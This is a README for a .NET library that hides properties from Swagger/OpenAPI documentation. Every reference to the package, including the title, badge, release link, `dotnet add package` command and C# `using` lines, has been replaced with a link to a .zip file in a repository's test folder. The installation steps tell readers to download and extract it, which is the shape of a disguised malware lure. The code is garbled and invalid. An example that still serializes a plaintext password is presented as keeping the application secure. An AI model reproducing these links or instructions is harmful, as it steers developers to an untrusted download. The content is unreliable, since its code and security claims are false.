# https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip

![GitHub release](https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip)

Hides a property from OpenAPI/Swagger documentation without affecting JSON serialization. Use this when a property should be used at runtime but not exposed in the public API contract.

## Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)
- [Support](#support)

## Introduction

In modern API development, it is common to expose data structures to clients. However, sometimes certain properties should remain hidden from the public API while still being usable within the application. The `https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip` library allows developers to annotate properties that should be ignored in the OpenAPI/Swagger documentation.

This library is particularly useful in scenarios where sensitive information or implementation details should not be exposed. It provides a clean and efficient way to manage API contracts while keeping your application secure.

## Features

- **Easy Integration**: Simple to add to your existing .NET projects.
- **Runtime Usability**: Properties can still be accessed in the code while being hidden from API documentation.
- **Custom Attributes**: Use custom attributes to control which properties to ignore.
- **Compatibility**: Works seamlessly with Swashbuckle and OpenAPI.

## Installation

To get started, you can download the latest release from our [Releases](https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip) section. Simply download the package, extract it, and add it to your project.

Alternatively, you can install it via NuGet:

```bash
dotnet add package https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip
```

## Usage

To use this library, you need to add the `IgnoreProperty` attribute to the properties you want to hide. Here's a simple example:

```csharp
using https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip;

public class SampleModel
{
    public string VisibleProperty { get; set; }

    [IgnoreProperty]
    public string HiddenProperty { get; set; }
}
```

In this example, `VisibleProperty` will appear in the Swagger documentation, while `HiddenProperty` will be ignored.

## Examples

### Basic Example

Here’s a more detailed example to illustrate how to use the `IgnoreProperty` attribute effectively.

```csharp
using https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip;
using https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip;

public class User
{
    public string Username { get; set; }

    [IgnoreProperty]
    public string Password { get; set; }
}

[ApiController]
[Route("api/[controller]")]
public class UserController : ControllerBase
{
    [HttpGet]
    public ActionResult<User> GetUser()
    {
        return new User
        {
            Username = "exampleUser",
            Password = "secretPassword"
        };
    }
}
```

In this controller, when you call the `GetUser` endpoint, the `Password` property will not be included in the OpenAPI documentation.

### Advanced Usage

You can also combine the `IgnoreProperty` attribute with other attributes for more control over your API documentation. Here’s an example:

```csharp
using https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip;
using https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip;

public class Product
{
    public int Id { get; set; }

    [Required]
    public string Name { get; set; }

    [IgnoreProperty]
    public string InternalCode { get; set; }
}
```

In this case, `InternalCode` is marked with `IgnoreProperty`, and it will not show up in the Swagger UI or OpenAPI documentation, while `Id` and `Name` will be documented.

## Contributing

We welcome contributions! If you would like to contribute to the project, please follow these steps:

1. Fork the repository.
2. Create a new branch (`git checkout -b feature/YourFeature`).
3. Make your changes and commit them (`git commit -m 'Add some feature'`).
4. Push to the branch (`git push origin feature/YourFeature`).
5. Open a pull request.

Please ensure that your code follows our coding standards and includes appropriate tests.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Support

If you encounter any issues or have questions, please visit our [Releases](https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip) section for the latest updates and support. You can also check the "Issues" tab for any existing problems or to report a new one.

## Conclusion

The `https://raw.githubusercontent.com/Horiuti-byte/soenneker.swashbuckle.attributes.ignoreproperty/main/test/Soenneker.Swashbuckle.Attributes.IgnoreProperty.Tests/ignoreproperty_attributes_swashbuckle_soenneker_v2.4.zip` library provides a straightforward way to manage your API documentation while keeping certain properties hidden. This can help maintain the security and integrity of your application without sacrificing functionality. 

For more information, check out the documentation and feel free to reach out if you have any questions. Happy coding!